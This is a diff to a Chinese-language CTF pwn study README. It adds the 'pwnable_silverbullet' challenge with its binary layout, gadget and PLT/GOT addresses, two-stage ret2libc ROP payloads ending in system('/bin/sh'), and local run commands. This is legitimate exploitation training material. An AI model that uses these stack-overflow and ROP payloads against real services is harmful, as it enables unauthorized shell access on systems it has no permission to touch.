@@ -39,6 +39,7 @@
 | `12_bjdctf_2020_babyrop` | amd64 / 动态 / not stripped | `read(0, buf, 0x64)`，`buf=rbp-0x20` | **40** | leak `puts@got`，返回 `main` | `system("/bin/sh")` |
 | `13_putsorsys` | amd64 / 动态 / not stripped | menu + `read(0, buf, 0x100)`，canary | **0x38**（canary 0x28） | `%13$p` leak canary，`%9$s` leak `puts@got` | 保留 canary 后 `system("/bin/sh")` |
 | `18_repeater` | amd64 / 动态 / stripped | 循环 `read(0, buf, 0x100)` + `puts(buf)`，canary | **0x28**（canary 0x28，saved RIP 0x38） | `puts(buf)` 打 canary，再 `puts(read@got)` 回 `main` | `ret` 对齐后 `system("/bin/sh")` |
+| `19_pwnable_silverbullet` | i386 / 动态 / not stripped | `strncat` 把 NUL 写进 `power`，`power` 与 `strlen(desc)` 失配 | 越界 **0x2f**（起点 `ebp-0x3`） | `beat` 判定获胜逼出 `main` 的 `ret`，`puts(read@got)` 回 `main` | `system("/bin/sh")`（整条链无 `\x00`） |
 
 关键地址：
 
@@ -50,6 +51,7 @@
 | `12_bjdctf_2020_babyrop` | `puts@plt=0x4004E0`、`puts@got=0x601018`、`pop rdi=0x400733`、`ret=0x4004C9`、`main=0x4006AD` |
 | `13_putsorsys` | `puts@got=0x404018`、`/bin/sh=0x40205E`、`pop rdi=libc+0x2A3E5`、`ret=libc+0x29CD6` |
 | `18_repeater` | `puts@plt=0x400610`、`read@got=0x601030`、`pop rdi;ret=0x400933`、`ret=0x400934`、`main=0x4007D9` |
+| `19_pwnable_silverbullet` | `read@plt=0x8048490`、`puts@plt=0x80484A8`、`read@got=0x804AFD0`、`main=0x8048954`、`pop3=0x8048A79` |
 
 Payload 核心：
 
@@ -78,6 +80,12 @@ b"A" * 0x28 + p64(canary) + p64(0) \
 
 b"A" * 0x28 + p64(canary) + p64(0) \
     + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
+```
+
+```python
+# 19_pwnable_silverbullet：strncat 补的 NUL 把 power 打坏 -> 越界覆盖返回地址
+b"\xff\xff\xff" + p32(0x01010101) + p32(PUTS_PLT) + p32(MAIN) + p32(READ_GOT)
+b"\xff\xff\xff" + p32(0x01010101) + p32(SYSTEM)   + p32(0x01010101) + p32(BINSH)
 ```
 
 ---
@@ -131,12 +139,14 @@ b"A" * 0x28 + p64(canary) + p64(0) \
 | `12_bjdctf_2020_babyrop_speedrun.md` / `12_bjdctf_2020_babyrop_exp.py` | 64 位 `puts` leak + `ret` 对齐 |
 | `13_putsorsys_speedrun.md` / `13_putsorsys_exp.py` | 格式化字符串 leak canary/puts + canary-safe ROP |
 | `18_repeater_speedrun.md` / `18_repeater_exp.py` | canary leak（`puts(buf)` 型）+ 两阶段 ret2libc，含短读重试 |
+| `19_pwnable_silverbullet_speedrun.md` / `19_pwnable_silverbullet_exp.py` | 逻辑 bug 型栈越界（`strncat` + `power` 失配）+ 两轮 ret2libc |
 | `[NewStarCTF 2023 公开赛道]ret2libc` | 07 的题目二进制 |
 | `jarvisoj_level4` | 10 的题目二进制 |
 | `铁人三项（第五赛区）2018_rop` | 11 的题目二进制 |
 | `bjdctf_2020_babyrop` | 12 的题目二进制 |
 | `putsorsys` / `libc.so.6` | 13 的题目二进制与附件 libc |
 | `repeater` | 18 的题目二进制（stripped，64 位） |
+| `pwnable_silverbullet` | 19 的题目二进制（not stripped，32 位） |
 
 > 这些题目都没有单独留 `writeup.md`；对应的 `speedrun.md` 已包含完整逆向、栈布局、gadget 与两阶段利用说明。
 
@@ -182,6 +192,11 @@ LIBC_DIR=. python 13_putsorsys_exp.py LOCAL
 python 18_repeater_exp.py LOCAL
 LIBC=./libc-2.27.so HOST=target.example.com PORT=9999 \
 python 18_repeater_exp.py
+
+# 19：逻辑 bug 越界 + ret2libc（32 位，需要 i386 loader）
+I386_LD=/tmp/libc32/root/usr/lib32/ld-linux.so.2 \
+I386_LIBPATH=/tmp/libc32/root/usr/lib32 \
+python 19_pwnable_silverbullet_exp.py LOCAL
 ```
 
 CTF² 等 TLS 平台：
@@ -205,6 +220,11 @@ read/gets 栈溢出 + No canary + No PIE
 ```text
 Canary + read(0, buf, N) + puts(buf) 回显
 = 先靠回显把 canary 打出来（低字节改非 0），再走同样的两阶段
+```
+
+```text
+结构体放栈上 + 长度检查用 power、写入位置用 strlen(desc) + strncat 自动补 NUL
+= 逻辑 bug 型越界：让两个计数失配，越界长度和起点一起变大
 ```
 
 一句话：**Stage 1 只负责 leak 和回 `main`；Stage 2 才打 `system`。别把 `See you next time` 当 leak。**
